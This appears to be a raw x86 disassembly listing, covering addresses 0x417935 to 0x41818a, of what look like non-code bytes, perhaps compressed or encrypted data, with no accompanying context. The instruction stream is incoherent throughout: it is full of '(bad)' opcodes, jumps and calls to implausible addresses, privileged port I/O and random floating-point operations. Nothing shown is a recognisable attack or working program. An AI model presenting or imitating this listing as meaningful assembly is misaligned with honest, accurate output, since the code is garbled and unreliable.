  417935:	mov    esp,0xe4daf303
  41793a:	aad    0xe2
  41793c:	fcomp  st(2)
  41793e:	paddd  mm0,QWORD PTR [esi]
  417941:	or     al,0xee
  417943:	shl    edi,cl
  417945:	(bad)  
  417946:	jmp    0xc7f8:0xc6b5daaa
  41794d:	repnz rcr bh,1
  417950:	shl    ecx,1
  417952:	call   0xf7225646
  417957:	rcl    esi,cl
  417959:	add    eax,0xdb08e9eb
  41795e:	loop   0x417942
  417960:	repnz adc bl,ah
  417963:	lods   al,BYTE PTR ds:[esi]
  417964:	ret    
  417965:	loope  0x41795a
  417967:	mov    al,0xac
  417969:	test   al,0xc8
  41796b:	fidivr DWORD PTR [edi-0x11111428]
  417971:	into   
  417972:	fldlg2 
  417974:	rcl    esp,cl
  417976:	(bad)  
  417977:	(bad)  
  417979:	ror    cl,cl
  41797b:	out    0x6,eax
  41797d:	fld    DWORD PTR [esi]
  41797f:	jecxz  0x417979
  417981:	add    ebp,ecx
  417983:	lods   al,BYTE PTR ds:[esi]
  417984:	lock fsubr st(2),st
  417987:	mov    bl,0xc2
  417989:	aam    0xd3
  41798b:	xlat   BYTE PTR ds:[ebx]
  41798c:	(bad)  
  41798e:	hlt    
  41798f:	fcos   
  417991:	mov    ah,0xd5
  417993:	add    ch,bl
  417995:	out    dx,al
  417996:	sti    
  417997:	(bad)  
  417998:	(bad)  
  417999:	(bad)  
  41799b:	or     ebx,edx
  41799d:	out    dx,eax
  41799e:	in     al,dx
  41799f:	ret    0xea04
  4179a2:	call   0xd5393e95
  4179a7:	div    BYTE PTR [esi-0x4b2a2446]
  4179ad:	in     eax,0xf2
  4179af:	cmc    
  4179b0:	int3   
  4179b1:	stc    
  4179b2:	dec    ch
  4179b4:	mov    eax,0xb9dec1b8
  4179b9:	repnz xlat BYTE PTR ds:[ebx]
  4179bb:	mul    dl
  4179bd:	add    eax,ecx
  4179bf:	cld    
  4179c0:	fdivr  st,st(0)
  4179c2:	repnz mov esi,0xe0f3e3c7
  4179c8:	shl    ch,0xbb
  4179cb:	(bad)  
  4179cc:	leave  
  4179cd:	lock mov ebx,0xefd7c9d4
  4179d3:	int3   
  4179d4:	add    dl,dl
  4179d6:	in     al,0xd3
  4179d8:	mov    ecx,0xcbf7e1d7
  4179dd:	inc    edi
  4179df:	(bad)  
  4179e0:	out    0xcf,al
  4179e2:	ffree  st(4)
  4179e4:	mov    cl,0xb6
  4179e6:	ret    
  4179e7:	fadd   st(4),st
  4179e9:	jmp    0xb83033d3
  4179ee:	mov    dh,0xf6
  4179f0:	shr    al,1
  4179f2:	fsubrp st(7),st
  4179f4:	mov    ebp,0xeadddcdc
  4179f9:	ret    0xc2e7
  4179fc:	sti    
  4179fd:	clc    
  4179fe:	retf   0xcee5
  417a01:	stc    
  417a02:	loopne 0x4179d4
  417a04:	(bad)
  417a07:	shl    bh,0xe6
  417a0a:	out    dx,eax
  417a0b:	call   0xb9104be1
  417a10:	mov    edi,0xdeefbfc2
  417a15:	rol    DWORD PTR ds:0xdddfd5c2,0x3
  417a1c:	jmp    0x83e7a28
  417a21:	int    0xb1
  417a23:	mov    eax,0xb2e7c3cb
  417a28:	fidiv  DWORD PTR [ebp-0xe242827]
  417a2e:	mov    ebp,0xd5efd9ed
  417a33:	(bad)  
  417a34:	icebp  
  417a35:	mov    esp,0xdafbe1f9
  417a3a:	(bad)  
  417a3c:	(bad)  
  417a3e:	jmp    0xb7c4:0xf0e70fcb
  417a45:	repnz scas eax,DWORD PTR es:[edi]
  417a47:	mov    bh,0xf1
  417a49:	(bad)  
  417a4b:	stc    
  417a4c:	jmp    0x417a37
  417a4e:	hlt    
  417a4f:	fdivp  st(6),st
  417a51:	hlt    
  417a52:	loopne 0x417a2a
  417a54:	(bad)  
  417a55:	rcr    ebp,1
  417a57:	(bad)  
  417a58:	sti    
  417a59:	clc    
  417a5a:	fdivp  st(2),st
  417a5c:	(bad)
  417a5f:	add    eax,0xc1ac12f8
  417a64:	shl    dl,0xab
  417a67:	(bad)  
  417a68:	repz retf 
  417a6a:	mov    dh,0xf7
  417a6c:	out    dx,eax
  417a6d:	in     al,dx
  417a6e:	int3   
  417a6f:	int    0xfe
  417a71:	mov    al,0xf9
  417a73:	ffreep st(2)
  417a75:	fstp   st(3)
  417a77:	fst    st(2)
  417a79:	cmc    
  417a7a:	inc    bh
  417a7c:	hlt    
  417a7d:	stc    
  417a7e:	jecxz  0x417a80
  417a80:	or     al,0xf1
  417a82:	jmp    0xd0ff3749
  417a87:	out    dx,al
  417a88:	in     eax,0xe5
  417a8a:	mov    ch,0xe0
  417a8c:	mov    ecx,0xdbb2fcd9
  417a91:	into   
  417a92:	div    BYTE PTR [esi-0x28234307]
  417a98:	(bad)
  417a9b:	(bad)
  417a9e:	sti    
  417a9f:	(bad)  
  417aa1:	push   cs
  417aa2:	fpatan 
  417aa4:	ret    
  417aa5:	lock shl ebx,cl
  417aa8:	lods   eax,DWORD PTR ds:[esi]
  417aa9:	out    0xcc,al
  417aab:	jmp    0xca363174
  417ab0:	iret   
  417ab1:	rcl    ebp,cl
  417ab3:	loope  0x417a91
  417ab5:	jecxz  0x417aad
  417ab7:	xlat   BYTE PTR ds:[ebx]
  417ab8:	xlat   BYTE PTR ds:[ebx]
  417ab9:	or     al,BYTE PTR [edx]
  417abb:	hlt    
  417abc:	(bad)  
  417abe:	in     al,dx
  417abf:	stc    
  417ac0:	jmp    0xadf3:0xb7edf1c0
  417ac7:	repnz (bad) 
  417ac9:	hlt    
  417aca:	aam    0xc7
  417acc:	(bad)  
  417acd:	cmc    
  417ace:	(bad)  
  417acf:	fcom   st(0)
  417ad1:	repz fsubr st(2),st
  417ad4:	aad    0xb8
  417ad6:	in     al,0xe3
  417ad8:	fsub   st,st(2)
  417ada:	cld    
  417adb:	fld    DWORD PTR ds:0xc1cbdd0d
  417ae1:	leave  
  417ae2:	leave  
  417ae3:	repz jecxz 0x417aa8
  417ae6:	int3   
  417ae7:	div    edx
  417ae9:	out    0xc5,al
  417aeb:	shr    eax,cl
  417aed:	mov    ch,0xce
  417aef:	std    
  417af0:	rol    DWORD PTR [ebx],1
  417af2:	fabs   
  417af4:	fadd   QWORD PTR [esi]
  417af6:	add    DWORD PTR [ebp+edi*8-0x52ff91d],edi
  417afd:	in     eax,0xc9
  417aff:	(bad)  
  417b01:	(bad)  
  417b02:	jmp    0x417acb
  417b04:	mov    edi,0xe0b3c2d7
  417b09:	sti    
  417b0a:	retf   0xf7b5
  417b0d:	mov    edx,0xbfb1f2f7
  417b12:	std    
  417b13:	stc    
  417b14:	cli    
  417b15:	(bad)  
  417b17:	loopne 0x417b0a
  417b19:	sar    ch,1
  417b1b:	shr    al,1
  417b1d:	or     eax,0xf3c4ebfa
  417b22:	fdiv   st,st(1)
  417b24:	rep lods al,BYTE PTR ds:[esi]
  417b26:	fsubr  QWORD PTR [esi-0x20323d29]
  417b2c:	repz mov esi,0xf4f7ecf5
  417b32:	mov    ebx,0xe4d1cf03
  417b37:	ror    DWORD PTR [ebx],cl
  417b39:	hlt    
  417b3a:	aad    0xb
  417b3c:	pop    es
  417b3d:	pop    es
  417b3e:	add    eax,0xac0e09c5
  417b43:	mov    eax,0xe7f7c6a9
  417b48:	mov    dl,0xc7
  417b4a:	jmp    0x417b02
  417b4c:	fxch   st(6)
  417b4e:	iret   
  417b4f:	retf   
  417b50:	(bad)  
  417b51:	(bad)  
  417b52:	(bad)  
  417b53:	test   BYTE PTR [ebx],0xb4
  417b56:	cli    
  417b57:	add    al,0xfb
  417b59:	jmp    0xcc168664
  417b5e:	add    eax,0xbfd8ec0f
  417b63:	scas   eax,DWORD PTR es:[edi]
  417b64:	call   0xcdf7434e
  417b69:	out    0xf1,al
  417b6b:	xlat   BYTE PTR ds:[ebx]
  417b6c:	fcmovbe st,st(0)
  417b6e:	mov    ecx,0xb8d2eccd
  417b73:	mov    eax,0xc5fc06e6
  417b78:	jecxz  0x417b79
  417b7a:	or     DWORD PTR ds:0xc6000fc8,eax
  417b80:	paddsw mm3,mm4
  417b83:	out    dx,eax
  417b84:	leave  
  417b85:	rcl    ah,cl
  417b87:	(bad)  
  417b88:	(bad)  
  417b89:	in     al,0xf0
  417b8b:	retf   
  417b8c:	idiv   ebx
  417b8e:	jmp    0xffd5:0xd5ded2ba
  417b95:	shl    cl,0xf4
  417b98:	inc    DWORD PTR [esi]
  417b9a:	xlat   BYTE PTR ds:[ebx]
  417b9b:	test   BYTE PTR [esi],0xd5
  417b9e:	into   
  417b9f:	jecxz  0x417b66
  417ba1:	les    ebp,FWORD PTR [eax-0x52162c0f]
  417ba7:	ret    
  417ba8:	out    0xf3,eax
  417baa:	in     eax,0xe9
  417bac:	(bad)  
  417bae:	vpsubw xmm1,xmm2,xmm2
  417bb2:	stc    
  417bb3:	int3   
  417bb4:	out    0xd7,al
  417bb6:	int    0xd5
  417bb8:	fndisi(8087 only) 
  417bba:	fdivr  st,st(4)
  417bbc:	retf   
  417bbd:	or     dh,ah
  417bbf:	out    dx,al
  417bc0:	clc    
  417bc1:	bswap  ecx
  417bc3:	mov    bl,0xbd
  417bc5:	loop   0x417b8c
  417bc7:	shl    dh,0xf0
  417bca:	(bad)  
  417bcb:	call   0xdc3735b4
  417bd0:	(bad)  
  417bd1:	mov    ebx,0xd0ecf7bd
  417bd6:	add    edi,DWORD PTR [ebp-0x3d0e2a0a]
  417bdc:	ror    dl,0xc8
  417bdf:	push   es
  417be0:	(bad)  
  417be2:	rep lods eax,DWORD PTR ds:[esi]
  417be4:	in     eax,dx
  417be5:	ret    0xe1d2
  417be8:	int    0xec
  417bea:	mov    bh,0xe5
  417bec:	mov    ebx,0xeaf4cbcd
  417bf1:	stc    
  417bf2:	repz rcl esi,cl
  417bf5:	add    ch,ah
  417bf7:	cmc    
  417bf8:	mov    ebp,0xffe1e6d1
  417bfd:	hlt    
  417bfe:	or     eax,DWORD PTR [edx]
  417c00:	sti    
  417c01:	add    al,0xdd
  417c03:	lods   al,BYTE PTR ds:[esi]
  417c04:	test   eax,0xe6b0eac9
  417c09:	call   0xcf1962ef
  417c0e:	icebp  
  417c0f:	into   
  417c10:	hlt    
  417c11:	ret    
  417c12:	cli    
  417c13:	mov    eax,0x1bdf7b9
  417c18:	out    0x6,eax
  417c1a:	fdiv   st,st(0)
  417c1c:	ffree  st(5)
  417c1e:	fcmove st,st(4)
  417c20:	or     BYTE PTR [edi],cl
  417c22:	mov    edi,0xd6efb3c0
  417c27:	int3   
  417c28:	aam    0xb6
  417c2a:	mov    al,0xc9
  417c2c:	fistp  QWORD PTR [edx-0x17153010]
  417c32:	ret    
  417c33:	(bad)  
  417c35:	aam    0xf8
  417c37:	cli    
  417c38:	rcl    edx,1
  417c3a:	shl    esi,0xfa
  417c3d:	into   
  417c3e:	iret   
  417c3f:	stc    
  417c40:	repz loop 0x417bf5
  417c43:	(bad)  
  417c45:	lods   eax,DWORD PTR ds:[esi]
  417c46:	mov    bl,0xe1
  417c48:	int    0xc4
  417c4a:	jmp    0x417c25
  417c4c:	lods   eax,DWORD PTR ds:[esi]
  417c4d:	out    0xba,al
  417c4f:	aad    0xf3
  417c51:	ret    
  417c52:	fcomip st,st(4)
  417c54:	in     al,dx
  417c55:	in     eax,dx
  417c56:	sti    
  417c57:	fisttp DWORD PTR [edx]
  417c59:	(bad)
  417c5c:	fnstsw WORD PTR [edx+ebp*8-0x1eee0004]
  417c63:	out    dx,eax
  417c64:	(bad)  
  417c66:	lods   eax,DWORD PTR ds:[esi]
  417c67:	out    0xac,al
  417c69:	in     eax,0xc1
  417c6b:	(bad)  
  417c6c:	mov    dh,0xfd
  417c6e:	repz into 
  417c70:	jmp    0xe7fc794e
  417c75:	ret    
  417c76:	aad    0xdc
  417c78:	aam    0xb
  417c7a:	std    
  417c7b:	fsubrp st(3),st
  417c7d:	push   cs
  417c7e:	pextrw esp,mm0,0xda
  417c82:	in     al,dx
  417c83:	out    0xae,eax
  417c85:	loopne 0x417c37
  417c87:	icebp  
  417c88:	xlat   BYTE PTR ds:[ebx]
  417c89:	lods   al,BYTE PTR ds:[esi]
  417c8a:	fcmovne st,st(4)
  417c8c:	(bad)  
  417c8d:	ror    bl,cl
  417c8f:	idiv   DWORD PTR [ebp+0x3b6e9c9]
  417c95:	ffree  st(6)
  417c97:	mov    dh,0xd0
  417c9a:	(bad)  
  417c9b:	rol    bh,1
  417c9d:	in     eax,dx
  417c9e:	push   cs
  417c9f:	int3   
  417ca0:	int    0xf
  417ca2:	into   
  417ca3:	into   
  417ca4:	out    0xd2,al
  417ca6:	fdiv   QWORD PTR [ebp-0x633443a]
  417cac:	xabort 0xca
  417caf:	test   bl,0xfa
  417cb2:	loope  0x417cb4
  417cb4:	(bad)  
  417cb6:	(bad)  
  417cb7:	inc    ah
  417cb9:	add    ah,dl
  417cbb:	ror    bl,1
  417cbd:	loop   0x417cae
  417cbf:	or     al,0xe1
  417cc1:	int3   
  417cc2:	lods   eax,DWORD PTR ds:[esi]
  417cc3:	retf   0xe3c7
  417cc6:	enter  0xb7f7,0xc6
  417cca:	ror    cl,cl
  417ccc:	in     al,0xf1
  417cce:	(bad)  
  417cd0:	sar    BYTE PTR [ebx-0x2743132e],cl
  417cd6:	(bad)
  417cd9:	push   es
  417cda:	or     ah,ch
  417cdc:	fucomip st,st(1)
  417cde:	ret    
  417cdf:	(bad)
  417ce2:	(bad)  
  417ce4:	int    0xf1
  417ce6:	icebp  
  417ce7:	ret    
  417ce8:	test   eax,0xd0ecd1eb
  417ced:	mov    al,0xef
  417cef:	(bad)  
  417cf0:	(bad)  
  417cf1:	xlat   BYTE PTR ds:[ebx]
  417cf2:	jmp    0xccff80eb
  417cf7:	(bad)
  417cfa:	(bad)
  417cfd:	clc    
  417cfe:	out    0xc,eax
  417d00:	adc    al,BYTE PTR [ebp*8-0x4f0e1b51]
  417d07:	int3   
  417d08:	mov    dh,0xcd
  417d0a:	int3   
  417d0b:	in     al,dx
  417d0c:	mov    cl,0xc6
  417d0e:	int    0xfb
  417d10:	jmp    0xcdbe:0xc2dcd7d4
  417d17:	cli    
  417d18:	rcl    dh,cl
  417d1a:	pop    es
  417d1b:	aam    0xf8
  417d1d:	push   es
  417d1e:	paddusw mm3,mm2
  417d21:	call   0xbd392ad0
  417d26:	loope  0x417d0c
  417d28:	int    0xd5
  417d2a:	mov    ebx,0xf3edf1b5
  417d2f:	icebp  
  417d30:	clc    
  417d31:	lock add bl,dl
  417d34:	out    dx,eax
  417d35:	int3   
  417d36:	loopne 0x417d12
  417d38:	cli    
  417d39:	loopne 0x417d20
  417d3b:	mov    esi,0xfcdcc9dc
  417d40:	or     esp,edx
  417d42:	into   
  417d43:	retf   0xeee1
  417d46:	stos   DWORD PTR es:[edi],eax
  417d47:	repz out 0xd1,al
  417d4a:	mov    ecx,0xd8d7f6d5
  417d4f:	cld    
  417d50:	stc    
  417d51:	cmc    
  417d52:	fild   WORD PTR [ecx]
  417d54:	(bad)  
  417d56:	fdivr  QWORD PTR [esi-0x253e2f27]
  417d5c:	hlt    
  417d5d:	pmulhuw mm5,mm5
  417d60:	loop   0x417d54
  417d62:	into   
  417d63:	mov    bl,0xe8
  417d65:	out    dx,eax
  417d66:	(bad)  
  417d67:	stos   BYTE PTR es:[edi],al
  417d68:	(bad)  
  417d69:	mov    ebx,0xf1ceebc6
  417d6e:	fdecstp 
  417d70:	(bad)  
  417d71:	hlt    
  417d72:	in     al,dx
  417d73:	fdiv   st(4),st
  417d75:	aam    0xbc
  417d77:	(bad)
  417d7b:	pop    es
  417d7c:	mov    ebp,0xf300c9fd
  417d81:	fsubrp st(3),st
  417d83:	out    0xc8,al
  417d85:	loop   0x417d67
  417d87:	ret    0xedb0
  417d8a:	mov    dl,0xb7
  417d8c:	out    0xef,eax
  417d8e:	mov    bl,0xcb
  417d90:	push   DWORD PTR [ebx+edi*4-0x2c1a2947]
  417d97:	mov    cl,0xfa
  417d9a:	lock loopne 0x417da2
  417d9d:	(bad)  
  417d9e:	int    0x4
  417da0:	push   es
  417da1:	adc    esi,DWORD PTR [ebx-0x3d343614]
  417da7:	retf   
  417da8:	mov    ebx,0xd2d3f0b1
  417dad:	repz fdivr st,st(6)
  417db0:	mov    eax,0x1fad2e3
  417db5:	int    0xf9
  417db7:	cmc    
  417db8:	add    al,bl
  417dba:	(bad)  
  417dbc:	aad    0xd4
  417dbe:	or     ecx,ebp
  417dc0:	add    esp,esp
  417dc2:	loop   0x417d97
  417dc4:	jmp    0xdc326dbe
  417dc9:	call   0xb92948a1
  417dce:	sar    bl,cl
  417dd0:	fdivp  st(0),st
  417dd2:	fneni(8087 only) 
  417dd4:	jecxz  0x417d9d
  417dd6:	ret    
  417dd7:	jecxz  0x417ddb
  417dd9:	stc    
  417dda:	les    ecx,FWORD PTR [edx]
  417ddc:	aad    0xe1
  417dde:	mov    BYTE PTR [eax],0xe
  417de1:	std    
  417de2:	mov    dl,0xcf
  417de4:	mov    esp,0xfae9f4f7
  417de9:	in     eax,dx
  417dea:	in     al,dx
  417deb:	out    dx,eax
  417dec:	stc    
  417ded:	int    0xd6
  417def:	cmc    
  417df0:	shl    ebx,cl
  417df2:	aad    0xf4
  417df4:	repnz hlt 
  417df6:	(bad)  
  417df8:	(bad)  
  417df9:	jecxz  0x417dfd
  417dfb:	leave  
  417dfc:	or     dh,dh
  417dfe:	aam    0xf
  417e00:	pop    es
  417e01:	enter  0xe4ea,0xe7
  417e05:	scas   al,BYTE PTR es:[edi]
  417e06:	out    dx,eax
  417e07:	call   0xe5394603
  417e0c:	out    0xda,al
  417e0e:	int    0xf2
  417e10:	cmc    
  417e11:	fcos   
  417e13:	loopne 0x417df3
  417e15:	repz fst st(3)
  417e18:	icebp  
  417e19:	cli    
  417e1a:	rcr    esi,0xd6
  417e1d:	loope  0x417e1b
  417e1f:	int3   
  417e20:	cld    
  417e21:	or     eax,esi
  417e23:	lock retf 
  417e25:	int3   
  417e26:	call   0xd3fd65fc
  417e2b:	clc    
  417e2c:	mov    edi,0xb1b5d2fa
  417e31:	enter  0xeeee,0xd6
  417e35:	fcmovnbe st,st(6)
  417e37:	(bad)  
  417e38:	(bad)  
  417e3a:	or     al,al
  417e3c:	cmc    
  417e3d:	in     eax,0x3
  417e3f:	(bad)  
  417e41:	add    eax,esp
  417e43:	lds    esi,FWORD PTR [ecx-0x3208541b]
  417e49:	enter  0xe5f5,0xd8
  417e4d:	rcl    ch,cl
  417e4f:	(bad)  
  417e51:	jmp    0x103:0xd9c0d9be
  417e58:	jmp    0x417e3e
  417e5a:	ret    
  417e5b:	inc    DWORD PTR [eax]
  417e5d:	add    cl,ch
  417e5f:	or     DWORD PTR [ebx],edx
  417e61:	into   
  417e62:	leave  
  417e63:	in     eax,0xf1
  417e65:	retf   0xfbf3
  417e68:	in     eax,dx
  417e69:	(bad)  
  417e6a:	mov    ah,0xc9
  417e6c:	shl    edx,cl
  417e6e:	iret   
  417e6f:	rcl    ebx,cl
  417e71:	std    
  417e72:	add    esi,ebx
  417e74:	add    ebx,edx
  417e76:	mov    ebp,0xc602f5cc
  417e7b:	fadd   DWORD PTR [esi+edx*8]
  417e7e:	loope  0x417e6d
  417e80:	or     eax,0xb3b3c9f8
  417e85:	repz jmp 0xf1f2:0xc4c5c6d2
  417e8d:	mov    esi,0x3eaecfa
  417e92:	cmc    
  417e93:	shr    esp,1
  417e95:	add    DWORD PTR ds:0xf4c3e3c0,eax
  417e9b:	add    cl,dl
  417e9d:	add    eax,ebp
  417e9f:	into   
  417ea0:	fld    QWORD PTR [esi+ebp*8]
  417ea3:	fistp  QWORD PTR [esi-0x2b3d2e13]
  417ea9:	ror    dl,0xd2
  417eac:	aad    0xb5
  417eae:	mov    edi,0xc8f2e3f8
  417eb3:	cli    
  417eb4:	ret    0xdbc0
  417eb7:	ret    
  417eb8:	(bad)
  417ebb:	fimul  DWORD PTR [edx]
  417ebd:	(bad)  
  417ebf:	out    dx,eax
  417ec0:	iret   
  417ec1:	(bad)  
  417ec2:	test   eax,0xe2c8d6b2
  417ec7:	ret    
  417ec8:	enter  0xfbf6,0xda
  417ecc:	leave  
  417ecd:	lods   al,BYTE PTR ds:[esi]
  417ece:	fstp   st(5)
  417ed0:	cld    
  417ed1:	(bad)  
  417ed2:	fdivp  st(7),st
  417ed4:	mov    edi,0xe7e5dd07
  417ed9:	(bad)  
  417edb:	add    ebx,ecx
  417edd:	out    0xe,eax
  417edf:	add    eax,ecx
  417ee1:	or     al,0xd0
  417ee3:	out    0xca,eax
  417ee5:	out    0xdc,al
  417ee7:	cmc    
  417ee8:	mul    eax
  417eea:	cli    
  417eeb:	loopne 0x417ebf
  417eed:	out    dx,al
  417eee:	call   0xd0446fa8
  417ef3:	out    dx,eax
  417ef4:	ret    0xffce
  417ef7:	loop   0x417ed2
  417ef9:	clc    
  417efa:	retf   0xe1f5
  417efd:	out    dx,al
  417efe:	psraw  mm1,mm3
  417f01:	(bad)  
  417f02:	leave  
  417f03:	mov    al,0xae
  417f05:	mov    al,0xee
  417f07:	ret    0xebd6
  417f0a:	mov    ah,0xd2
  417f0c:	rcl    ah,cl
  417f0e:	hlt    
  417f0f:	sti    
  417f10:	cli    
  417f11:	repz add ebp,ebx
  417f14:	into   
  417f15:	add    al,bh
  417f17:	fmul   QWORD PTR [ebx]
  417f19:	pop    es
  417f1a:	fcmovnbe st,st(0)
  417f1c:	(bad)  
  417f1e:	leave  
  417f1f:	out    0xdb,eax
  417f21:	repnz faddp st(4),st
  417f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f25:	call   0xd416371f
  417f2a:	cmc    
  417f2b:	mov    eax,0xf6fcdbc6
  417f30:	not    ch
  417f32:	(bad)  
  417f33:	fld    DWORD PTR [esi]
  417f35:	mov    ebp,0xd5f3d100
  417f3a:	std    
  417f3b:	aad    0xd8
  417f3d:	in     eax,0xda
  417f3f:	jmp    0xab2d4f30
  417f44:	out    0xbe,eax
  417f46:	hlt    
  417f47:	sar    DWORD PTR [ebx-0x18070b2f],cl
  417f4d:	repz int3 
  417f4f:	retf   
  417f50:	mov    ah,0xfb
  417f52:	shl    ecx,1
  417f54:	out    0xb4,eax
  417f56:	sti    
  417f57:	(bad)  
  417f58:	(bad)  
  417f59:	(bad)  
  417f5b:	add    eax,0xc2ebfabd
  417f60:	in     eax,0xc0
  417f62:	iret   
  417f63:	shl    edx,cl
  417f65:	fidiv  WORD PTR [ecx-0x4c44563c]
  417f6b:	mov    ah,0xb6
  417f6d:	jmp    0x417f3e
  417f6f:	fmul   st,st(0)
  417f71:	(bad)  
  417f73:	mov    esi,0xd7bb0607
  417f78:	(bad)
  417f7b:	rol    cl,0xfa
  417f7e:	in     al,0xd4
  417f80:	out    0xee,al
  417f82:	jmp    0x417f49
  417f84:	mov    cl,0xad
  417f87:	shl    DWORD PTR [eax-0x36495010],0xea
  417f8e:	mov    edx,0xbaedbbcd
  417f93:	ret    
  417f94:	aad    0xfe
  417f96:	sar    eax,cl
  417f98:	add    eax,0xad009fa
  417f9d:	mov    esp,0xdcac4e1
  417fa2:	into   
  417fa3:	into   
  417fa4:	icebp  
  417fa5:	(bad)  
  417fa6:	(bad)  
  417fa7:	div    BYTE PTR [ebx-0x48244a36]
  417fad:	fcom   st(7)
  417faf:	mov    dh,0xfd
  417fb1:	xlat   BYTE PTR ds:[ebx]
  417fb2:	clc    
  417fb3:	idiv   ah
  417fb5:	cli    
  417fb6:	add    edx,ecx
  417fb8:	cli    
  417fb9:	loopne 0x417f9f
  417fbb:	(bad)  
  417fbc:	enter  0xffdf,0xfe
  417fc0:	adc    ah,bl
  417fc2:	rol    edi,cl
  417fc4:	repnz in al,dx
  417fc6:	out    dx,al
  417fc7:	aad    0xc4
  417fc9:	test   al,0xca
  417fcb:	mov    esi,0xf5dad3cd
  417fd1:	loope  0x417fca
  417fd3:	stc    
  417fd4:	mov    esi,0xc7fdfbbf
  417fd9:	fucompp 
  417fdb:	(bad)  
  417fdd:	jmp    0xef485ace
  417fe2:	jecxz  0x417f8d
  417fe4:	(bad)  
  417fe5:	loop   0x417fa3
  417fe7:	jecxz  0x417fbf
  417fe9:	aam    0xcb
  417feb:	in     eax,0xc8
  417fed:	stc    
  417fee:	mov    ah,0xf2
  417ff0:	fmulp  st(0),st
  417ff2:	loopne 0x417ff2
  417ff4:	out    0xec,eax
  417ff6:	mov    ebp,0xfffef9e1
  417ffb:	jmp    0xd2d54cb
  418000:	or     bl,al
  418002:	icebp  
  418003:	loop   0x417fd7
  418005:	mov    al,0xf1
  418007:	ret    0xe0ad
  41800a:	clc    
  41800b:	imul   ah
  41800d:	(bad)  
  41800e:	aam    0xdf
  418010:	out    dx,eax
  418011:	dec    edi
  418013:	test   dh,0xd8
  418016:	fdiv   st,st(5)
  418018:	fsubp  st(2),st
  41801a:	fsubr  st(6),st
  41801c:	out    0xed,al
  41801e:	or     ecx,ebp
  418020:	jmp    0xeb134313
  418025:	repnz shl bh,1
  418028:	(bad)  
  418029:	div    DWORD PTR [esi-0x26193233]
  41802f:	fcomip st,st(0)
  418031:	xlat   BYTE PTR ds:[ebx]
  418032:	cld    
  418033:	fcomip st,st(5)
  418035:	mov    esi,0xd6daf3db
  41803a:	aad    0xe9
  41803c:	xlat   BYTE PTR ds:[ebx]
  41803d:	(bad)  
  41803e:	fucomi st,st(6)
  418040:	call   0xc4055a0d
  418045:	call   0xc7316726
  41804a:	out    dx,al
  41804b:	repnz (bad) 
  41804e:	clc    
  41804f:	into   
  418050:	fcmove st,st(4)
  418052:	out    dx,al
  418053:	fstp   st(2)
  418055:	(bad)  
  418057:	add    eax,0xf7c407d2
  41805c:	retf   
  41805d:	add    esi,esp
  41805f:	or     dl,BYTE PTR [ebx]
  418061:	stc    
  418062:	ror    ebp,1
  418064:	jmp    0xb5f93320
  418069:	jmp    0x41801b
  41806b:	loopne 0x41806c
  41806d:	mov    eax,0xd3cff7c8
  418072:	add    ch,cl
  418074:	out    0xf9,al
  418076:	std    
  418077:	(bad)
  41807a:	or     bh,bl
  41807c:	out    0xeb,al
  41807e:	jmp    0x41805c
  418080:	adc    al,BYTE PTR [esi]
  418082:	mov    ebp,0xe2dde5f7
  418087:	scas   al,BYTE PTR es:[edi]
  418088:	int    0xcd
  41808a:	xlat   BYTE PTR ds:[ebx]
  41808b:	(bad)  
  41808c:	jmp    0xbe:0xd6b2d1b0
  418093:	in     al,dx
  418094:	mov    ch,0x3
  418096:	ret    
  418097:	loopne 0x418095
  418099:	add    esp,edx
  41809b:	sar    edi,0xe2
  41809e:	in     eax,dx
  41809f:	fldl2t 
  4180a1:	iret   
  4180a2:	retf   0xe3c0
  4180a5:	leave  
  4180a6:	aam    0xc2
  4180a8:	mov    cl,0xe0
  4180aa:	cmc    
  4180ab:	loopne 0x418084
  4180ad:	fdiv   st,st(0)
  4180af:	mov    edi,0xf0f0bcc8
  4180b4:	int3   
  4180b5:	mov    eax,0xd8dffae3
  4180ba:	fcmovnu st,st(7)
  4180bc:	leave  
  4180bd:	enter  0x3ca,0xc4
  4180c1:	jmp    0xddfe4771
  4180c6:	mov    bh,0xb7
  4180c8:	repnz fnstenv [esi-0xb0d2a29]
  4180cf:	sar    ah,1
  4180d1:	leave  
  4180d2:	into   
  4180d3:	(bad)  
  4180d4:	mov    esi,0xd600bedf
  4180d9:	bnd ret 0xdcc2
  4180dd:	ror    al,0xe1
  4180e0:	pop    es
  4180e1:	or     al,0xf1
  4180e3:	retf   0xf7e1
  4180e6:	in     al,0xf7
  4180e8:	in     al,0xe7
  4180ea:	in     al,0xd2
  4180ec:	jmp    0xe8d2:0xe8d2ecb0
  4180f3:	int    0xd8
  4180f5:	fdivr  DWORD PTR [edi-0x18470f21]
  4180fb:	add    ebp,eax
  4180fd:	add    al,0xe9
  4180ff:	push   cs
  418100:	iret   
  418101:	loope  0x4180e5
  418103:	loope  0x4180d8
  418105:	test   al,0xd3
  418107:	mov    al,0xf0
  418109:	mov    ah,0xd7
  41810b:	int3   
  41810c:	mov    cl,0xd2
  41810e:	int3   
  41810f:	div    ebx
  418111:	in     eax,dx
  418112:	fcomi  st,st(0)
  418114:	jecxz  0x4180f4
  418116:	dec    BYTE PTR [ebx]
  418118:	imul   cl
  41811a:	(bad)  
  41811c:	call   0xfc198802
  418121:	or     bl,al
  418123:	into   
  418124:	out    0xf3,eax
  418126:	aam    0xe2
  418128:	cmc    
  418129:	cli    
  41812a:	hlt    
  41812b:	mov    dh,0xe9
  41812d:	retf   
  41812e:	ror    bl,1
  418130:	shl    BYTE PTR [edi+edx*8-0x2520f8ff],1
  418137:	add    bl,cl
  418139:	or     ch,cl
  41813b:	shl    ah,0xdb
  41813e:	pop    es
  41813f:	in     eax,dx
  418140:	out    dx,eax
  418141:	leave  
  418142:	icebp  
  418143:	shr    bl,cl
  418145:	leave  
  418146:	jmp    0x4180f5
  418148:	repz jmp 0xc0136c26
  41814e:	xlat   BYTE PTR ds:[ebx]
  41814f:	cmc    
  418150:	fcmovnbe st,st(2)
  418152:	rol    al,1
  418154:	fidivr WORD PTR [ebp-0x391d2e22]
  41815a:	xlat   BYTE PTR ds:[ebx]
  41815b:	loope  0x418164
  41815d:	jmp    0xe035814f
  418162:	int3   
  418163:	out    dx,eax
  418164:	enter  0xbcd3,0xc8
  418168:	out    dx,eax
  418169:	sti    
  41816a:	repnz mov dh,0xd2
  41816d:	(bad)  
  41816f:	mov    dh,0xbf
  418171:	sti    
  418172:	call   0xd5455a4b
  418177:	test   ecx,0xc605d7d6
  41817d:	in     al,0x5
  41817f:	in     al,0xe8
  418181:	int    0xa7
  418183:	in     eax,dx
  418184:	fsubr  QWORD PTR [esi-0x294c3f1d]
  41818a:	mov    ah,0xd8
